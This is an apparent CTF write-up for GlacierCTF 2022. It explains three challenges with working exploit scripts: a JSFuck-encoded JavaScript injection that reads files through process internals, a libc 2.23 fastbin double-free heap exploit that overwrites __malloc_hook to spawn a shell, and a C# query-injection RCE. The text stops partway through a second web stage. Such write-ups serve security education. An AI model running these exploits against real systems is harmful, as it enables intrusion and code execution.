---
title: "glacier ctf 2022"
date: "2022-11-28"
tags: ["CTF", "glacier", "jeopardy"]
---

# Pwn

## Break the calculator
The following code runs on the server:

```js
const readline = require("readline");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  terminal: false,
});

function calculate(formula) {
  const parsedFormula = formula.replace(/\s/g, "");
  if (parsedFormula.match(/^[^a-zA-Z\s]*$/)) {
    console.log(parsedFormula.length);
    console.log(parsedFormula);
    console.log();
    const result = Function("return " + parsedFormula)();
    console.log("Result: " + result + " - GoodBye");
  } else {
    console.log("Don't hack here - GoodBye!");
  }
  rl.close();
  process.exit(0);
}

console.log("Welcome to my Calculator! Please type in formula:");
rl.on("line", (line) => {
  calculate(line);
});
```

We can see that it creates a function with our input, given that our inputs contains no letter. Creating a function with our input is very similar to calling `eval` on it, and the same (in)security implications apply.

As we can use all the symbols we want, we can simply use [JSFuck](http://www.jsfuck.com/) to pass in our payload. The main problem is that many NodeJS built-ins are missing in there for some reason (e.g. there is no require!). After a bit of fiddling with it, we can find that `process` is still defined, and following its fields we can find a way to load the `fs` module, which allows us to read the flag!

The payload is the following:

```js
console.log(process.mainModule.constructor._load('fs').readFileSync('/app/flag.txt', 'utf8'));
```

and the script to send the payload is the following:

```py
#!/usr/bin/env python

from pwn import *

io = remote("pwn.glacierctf.com", 13375)
# console.log(process.mainModule.constructor._load('fs').readFileSync('/app/flag.txt', 'utf8'));
io.sendlineafter(
    b"Please type in formula:",
    "[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+([][[]]+[])[+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())",
)

io.interactive()
```

## Old dayz
This is a heap challenge, but with the novelty being that it uses libc2.23 (basically, the libc used by ubuntu 16.04). The challenge files can be downloaded [here](/downloadables/glacier_old_dayz.zip).

Inside the binary, we have the standard menu: we can malloc up to 0x1000 bytes, free our previously allocated memory, write on it and read it.
The issue is that the free functionality is implemented incorrectly: it does *not* zero out the pointers, therefore leaving us with a dangling reference and the possibility to manipulate the heap at our wish.

The first thing we have to do is to leak a libc address. To do so, we can use a very standard technique, that is reading the memory from a freed chunk that is in the unsorted bin. This works as the unsorted bin contain a pointer to the bin structure residing in libc.

Then, we can overwrite a hook (`__malloc_hook` or `__free_hook`). To do so, we can force the heap to return us a point to it. However, libc2.23 has an additional check on the returned pointer:
```c
  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp = *fb;
      do
        {
          victim = pp;
          if (victim == NULL)
            break;
        }
      while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
             != victim);
      if (victim != 0)
        {
          // Checks that the chunksize of the target chunk fastbin index 
          // is the same as the fastbin index we are allocating from
          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
            {
              errstr = "malloc(): memory corruption (fast)";
            errout:
              malloc_printerr (check_action, errstr, chunk2mem (victim), av);
              return NULL;
            }
          check_remalloced_chunk (av, victim, nb);
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
```
Due to this check, we need to return a pointer to a part of memory that contains a valid fastbin size. Luckily, `__malloc_hook` has a zone of memory very near it (while `__free_hook` doesn't). This is made possible by the fact that malloc here does *not* check that the returned chunk is aligned. Due to having only access to `__malloc_hook`, we need to use a `one_gadget` to overwrite it and pop a shell.

So, to implement this attack, we need to get a pointer to `__malloc_hook`. This can be done by using a [fastbin double free](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup_into_stack.c), which then overwrites `__malloc_hook` with a suitable `one_gadget`.

The exploit is the following:
```py
#!/usr/bin/env python3

from pwn import *

HOST = "pwn.glacierctf.com"
PORT = 13377

exe = ELF("./old_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ["kitty"]
io = None


def conn(*a, **kw):
    if args.LOCAL:
        return process([exe.path], **kw)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript="symbol-file old", **kw)
    else:
        return remote(HOST, PORT, **kw)


# Add functions below here, if needed
def add(idx, size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"idx:", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())


def free(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"idx: ", str(idx).encode())


def change(idx, content):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendafter(b"contents: ", content)


def view(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"idx: ", str(idx).encode())


def bye():
    io.sendlineafter(b"> ", b"5")


def main():
    global io
    io = conn(level="debug")

    # good luck pwning :)
    # leak libc
    add(0, 0x450)  # unsorted bin size
    add(1, 0x10)  # avoid consolidation of the above when freed
    free(0)  # puts 0 in unsorted bins
    view(0)  # libc leak
    libc.address = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - (
        libc.symbols.main_arena + 88  # Offset of the leak found with GDB
    )
    log.success(f"libc @ {hex(libc.address)}")

    # cleanup
    add(0, 0x450)

    # overwrite __malloc_hook
    add(3, 0x60)
    add(4, 0x60)
    # fastbin double free
    free(3)

    # free(4) needed to bypass a check: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3933
    free(4)
    free(3)  # double free!

    # chunksize on this pointer returns a size of 0x7f, which is valid for fastbins
    # 0x7f comes by taking a misaligned pointer to libc
    change(3, p64(libc.symbols.__malloc_hook - 0x23))

    add(5, 0x60)
    add(6, 0x60)  # contains our pointer into libc!

    """
    0x45226 execve("/bin/sh", rsp+0x30, environ)
    constraints:
      rax == NULL

    0x4527a execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL

    0xf03a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL

    0xf1247 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    """
    # Overwrite __malloc_hook with a one_gadget
    change(6, b"A" * 3 + b"B" * 8 * 2 + p64(libc.address + 0x4527A))
    add(0, 0x10)  # Trigger __malloc_hook
    
    # Profit!
    io.sendline(b"cat flag.txt")
    io.interactive()


if __name__ == "__main__":
    main()
```

# Web

## RCE as a Service

### Stage 1

#### Challenge description
> Cloud computing is trending? Says your grandpa!
>
> Edge Computing is the future! And the future is now. Today!
> 
> Give us a lambda and an array to operate on and our modern .NET6-powered backend will compute the results on an edge near your user in no time.
> 
> But please don't try to run custom code, because this incident will be reported.
> 
> (Goal: Read flag.txt at the filesystem's root.)

##### Attachments

> Program.cs

> api_usage.md

#### Analysis

By reading the code (and the examples given) we can clearly see how the endpoint `/rce` works: it expects a JSON with two parameters, `data` and `query`, and injects the `query` parameter, as it is, in the following code:

```C#
using System;
using System.Linq;
using System.Collections.Generic;

namespace RCE
{{
    public static class Factory
    {{
        public static Func<IEnumerable<string>, IEnumerable<object>> 
            CreateQuery = {query};
    }}
}}
```

The code is then parsed, compiled and executed passing the provided data, and the output is returned.

The following example is given in the markdown file:
```shell
curl --request POST \
  --url http://localhost:8001/rce \
  --header 'Content-Type: application/json' \
  --data '{
	"Data": ["Charmander", "Bulbasaur", "Bulbasaur"],
	"Query": "(data) => data.Select((d) => d == \"Bulbasaur\" ?
        \"Charmander\" : d)"
}'
```
which returns `["Charmander","Charmander","Charmander"]`.

#### Exploiting

The exploit is pretty easy. We need to read a file, but since we cannot inject a [`using` directive](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/keywords/using-directive) we have to specify the fully qualified name of the class we want to use.
Based on the example previously given, we set in `Data` the file we want to read and we inject the code to read it in `Query`:
```Python
#!/usr/bin/env python3
import requests

base = 'https://rce-as-a-service-1.ctf.glacierctf.com'

def send_rce(data, code):
    endpoint = base + '/rce'
    payload = { 'Data': data, 'Query': code}
    res = requests.post(endpoint, json=payload)
    return res.text

print(send_rce(['/flag.txt'], 
    '(data) => data.Select((d) => System.IO.File.ReadLines(d))'))
```

### Stage 2

#### Challenge description

> It came to our attention that a highly advanced APT targeted our edge computing system. In order to stop the attacks, we implemented even more advanced mitigations.
> 
> Think seccomp, but for the web!
> 
> Now there's no way an attacker could run malicious code, right?
> 
> (Goal: Read flag.txt at the filesystem's root.)

##### Attachments

> Program.cs

> api_usage.md

#### Analysis

The code is the same, except for the fact that this time a regex blocks our previous payload:
```C#
// Here we can adjust the difficulty of the challenge by banning certain functions.
var fileSystemUsage = Regex.IsMatch(query, "System.IO");

if (fileSystemUsage) {
    throw new Exception("'System.IO is not in the edge-computing file. 
